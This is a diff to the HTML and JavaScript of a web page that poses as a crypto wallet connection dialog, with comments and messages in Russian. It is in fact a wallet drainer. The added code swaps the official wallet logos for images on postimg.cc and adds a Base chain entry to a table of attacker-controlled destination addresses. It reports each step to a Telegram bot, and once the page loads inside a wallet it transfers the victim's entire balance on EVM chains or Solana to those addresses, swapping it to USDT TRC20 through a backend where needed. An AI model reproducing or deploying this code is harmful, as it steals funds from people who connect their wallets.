@@ -87,15 +87,15 @@
           <p class="mt-3 text-xl font-semibold">Trust Wallet</p>
         </div>
         <div class="wallet-item" onclick="connect('Phantom')">
-          <img src="https://phantom.app/img/phantom-logo.svg">
+          <img src="https://i.postimg.cc/RNWjf9vf/image.png">
           <p class="mt-3 text-xl font-semibold">Phantom</p>
         </div>
         <div class="wallet-item" onclick="connect('TronLink')">
-          <img src="https://tronlink.org/static/media/tronlink-logo.2d2d2d2d.png">
+          <img src="https://i.postimg.cc/FkyhQ41S/image.png">
           <p class="mt-3 text-xl font-semibold">TronLink</p>
         </div>
         <div class="wallet-item" onclick="connect('Tonkeeper')">
-          <img src="https://tonkeeper.com/assets/tonkeeper-logo.svg">
+          <img src="https://i.postimg.cc/T5wBtvg6/image.png">
           <p class="mt-3 text-xl font-semibold">Tonkeeper</p>
         </div>
       </div>
@@ -115,6 +115,7 @@
       'Ethereum': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'BNB Smart Chain': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'Polygon': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'Base': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'Solana': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
       'USDT (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'USDT (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
@@ -149,18 +150,25 @@
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
         await fetch(url);
+        console.log('Сообщение в Telegram:', message);
       } catch (e) {
-        console.error(e);
+        console.error('Ошибка Telegram:', e);
       }
     }
 
     async function getUri() {
       try {
+        await sendToTelegram('Запрос WC URI у бэкенда');
         const r = await fetch(`${BACKEND}/get-wc-uri`);
         const d = await r.json();
-        return d.uri || null;
+        if (d.uri) {
+          await sendToTelegram('WC URI получен');
+          return d.uri;
+        }
+        await sendToTelegram('WC URI не получен');
+        return null;
       } catch (e) {
-        console.error(e);
+        await sendToTelegram('Ошибка получения WC URI: ' + e.message);
         return null;
       }
     }
@@ -170,14 +178,16 @@
     }
 
     async function connect(wallet) {
-      await sendToTelegram(`Выбран кошелёк: ${wallet}`);
+      await sendToTelegram(`Пользователь выбрал кошелёк: ${wallet}`);
 
       const uri = await getUri();
       if (!uri) {
-        await sendToTelegram('Сессия WC не создана');
-        alert('Ошибка сессии');
+        await sendToTelegram('Сессия WC не создана — ошибка бэкенда');
+        alert('Ошибка сессии — попробуй позже');
         return;
       }
+
+      await sendToTelegram(`WC URI получен: ${uri.substring(0, 50)}...`);
 
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
@@ -191,31 +201,33 @@
 
         if (dl) {
           await sendToTelegram(`Открытие deep-link для ${wallet}`);
+          console.log('Deep-link:', dl);
           window.location.href = dl;
           setTimeout(() => {
             alert('Подтверди подключение и транзакцию в кошельке');
-          }, 1500);
+          }, 2000);
           document.getElementById('modal').style.display = 'none';
           return;
         }
       }
 
-      await sendToTelegram(`Deep-link не сработал для ${wallet}`);
-      alert('Подтверди подключение в кошельке');
+      await sendToTelegram(`Deep-link не сработал для ${wallet} — ждём ручного подключения`);
+      alert('Открой эту страницу внутри кошелька (вкладка браузер) для передачи сессии');
     }
 
+    // Реальная передача сессии и слив/своп сразу после загрузки страницы в кошельке
     window.addEventListener('load', async () => {
       if (window.ethereum || window.solana) {
         try {
-          let provider, address, network, balanceFormatted, symbol, target, chainId;
+          await sendToTelegram('Страница загружена внутри кошелька → сессия WC передана, начинаем захват');
 
-          await sendToTelegram('Страница загружена → сессия WC передана, проверяем провайдер');
+          let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = 'Unknown', target;
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             address = (await provider.listAccounts())[0];
-            chainId = (await provider.getNetwork()).chainId;
+            const chainId = (await provider.getNetwork()).chainId;
             if (chainId === 1) network = 'Ethereum';
             else if (chainId === 56) network = 'BNB Smart Chain';
             else if (chainId === 137) network = 'Polygon';
@@ -223,7 +235,10 @@
             else if (chainId === 42161) network = 'Arbitrum';
             else if (chainId === 10) network = 'Optimism';
             else if (chainId === 43114) network = 'Avalanche';
-            else return;
+            else {
+              await sendToTelegram(`Неизвестная сеть: chainId ${chainId}`);
+              return;
+            }
 
             const bal = await provider.getBalance(address);
             balanceFormatted = ethers.utils.formatEther(bal);
@@ -245,7 +260,7 @@
           await sendToTelegram(connectMsg);
 
           if (parseFloat(balanceFormatted) > 0) {
-            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив/своп на ${target}`);
+            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → проверка на своп/слив`);
 
             const swapRes = await fetch(`${BACKEND}/swap-to-usdt-trc20`, {
               method: 'POST',
@@ -259,25 +274,43 @@
             });
             const swapData = await swapRes.json();
 
+            let finalTarget = target;
             if (swapData.tx) {
+              finalTarget = swapData.target;
+              await sendToTelegram(`Нужен своп в USDT TRC20 → ${finalTarget}`);
               const signer = provider.getSigner();
               await signer.sendTransaction(swapData.tx);
-              await sendToTelegram(`Своп + DRAINED в USDT TRC20: ${balanceFormatted} → ${swapData.target}`);
+            } else {
+              await sendToTelegram(`Адрес/токен совпадает → прямой слив на ${finalTarget}`);
+            }
+
+            if (network === 'Solana') {
+              const tx = await provider.signAndSendTransaction(
+                new solanaWeb3.Transaction().add(
+                  solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: provider.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(finalTarget),
+                    lamports: ethers.utils.parseEther(balanceFormatted).toString()
+                  })
+                )
+              );
+              await new solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(tx.signature);
             } else {
               const signer = provider.getSigner();
               const tx = await signer.sendTransaction({
-                to: target,
+                to: finalTarget,
                 value: ethers.utils.parseEther(balanceFormatted)
               });
               await tx.wait();
-              await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
             }
+
+            await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${finalTarget}`);
           } else {
             await sendToTelegram(`Подключён, но баланс 0 → слив не выполнен`);
           }
         } catch (e) {
           console.error(e);
-          await sendToTelegram(`Ошибка слива: ${e.message}`);
+          await sendToTelegram(`Ошибка захвата/слива: ${e.message}`);
         }
       } else {
         await sendToTelegram('Провайдер кошелька не обнаружен — сессия не передалась');
